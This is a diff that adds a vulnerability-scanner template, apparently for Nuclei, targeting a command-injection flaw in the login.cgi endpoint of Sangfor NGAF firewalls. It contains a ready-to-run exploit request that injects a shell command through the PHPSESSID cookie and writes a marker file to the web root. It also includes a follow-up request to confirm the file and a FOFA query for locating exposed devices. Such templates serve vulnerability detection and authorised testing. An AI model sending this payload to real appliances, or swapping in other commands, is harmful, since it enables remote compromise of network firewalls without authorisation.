@@ -1,0 +1,38 @@
+id: sangfor-ngfw-login-rce
+
+info:
+  name: sangfor-ngfw-login-rce
+  author: yy
+  severity: high
+  description: 深信服下一代防火墙（Next-Generation Application Firewall）NGAF是面向应用层设计，能够精确识别用户、应用和内容，具备完整安全防护能力，能够全面替代传统防火墙，并具有强劲应用层处理能力的全新网络安全设备。深信服下一代防火墙（Next-Generation Application Firewall）NGAF的login.cgi接口对用户传入的参数未进行有效的过滤，攻击者可利用该漏洞获取服务器的权限。
+  tags: sangfor,rce
+  metadata:
+    fofa-qeury: app="SANGFOR-防火墙类产品"
+    veified: true
+    max-request: 2
+
+http:
+  - raw:
+      - |      
+        POST /cgi-bin/login.cgi HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36
+        Content-Type: Application/X-www-Form
+        Cookie: PHPSESSID=`$({{rce}})`;
+
+         {"opr":"login", "data":{"user": "watchTowr" , "pwd": "watchTowr" , "vericode": "EINW" , "privacy_enable": "0"}}
+      - |      
+        GET /svpn_html/qwer.txt HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36
+        Y-Forwarded-For: 127.0.0.1      
+
+    payloads:
+      rce:
+        - "echo 156828301~ > /fwlib/sys/virus/webui/svpn_html/qwer.txt"
+
+    matchers:     
+      - type: dsl
+        name: sqlserver
+        dsl:
+          - "status_code_1 == 200 && contains(body,'156828301~') && contains(header,'text/plain')" 
